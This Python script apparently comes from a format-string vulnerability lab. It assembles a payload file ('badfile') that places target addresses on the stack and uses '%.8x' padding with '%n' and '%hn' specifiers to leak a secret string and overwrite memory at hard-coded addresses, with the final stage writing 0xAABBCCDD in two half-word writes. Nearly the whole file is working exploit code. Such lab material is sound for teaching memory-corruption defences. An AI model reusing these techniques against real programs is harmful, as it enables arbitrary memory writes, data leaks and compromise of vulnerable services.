#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
#number  =  0x080e5068
#content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

#s = "%.8x_" *63 +"%s" 

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
# Informaiton Gathering/vulnerability analysis
#s = "%.8x_"*63 + "\n"

# Exploit secret string printing at address 0x080b4008
#s = "%.8x_"*63 + "%s"

# Exploit to change the value of the target address 0x080e5068 to 0x11223344 to any value 
#s = "%.8x"*63 + "%n"

# Exploit to change the value of the target address 0x080e5068 to 0x11223344 to 0x5000

#s = "%.8x"*62

#leftout = 0x5000 - (8*62 + 4)
#s +="%." + str(leftout) + "x%n\n"


# Exploit to change the value of the target address 0x080e5068 to 0x11223344 to 0xAABBCCDD

addr1 = 0x080e5068
addr2 = 0x080E506A
content[0:4]  =  (addr2).to_bytes(4,byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12]  =  (addr1).to_bytes(4,byteorder='little')

C = 62
D1 = 0xAABB - 12 - 8*C
D2 = 0xCCDD - 0xAABB
s = "%.8x"*C + "%." + str(D1) + "x" + "%hn" \
             + "%." + str(D2) + "x" + "%hn" + "\n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
print(len(fmt))
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
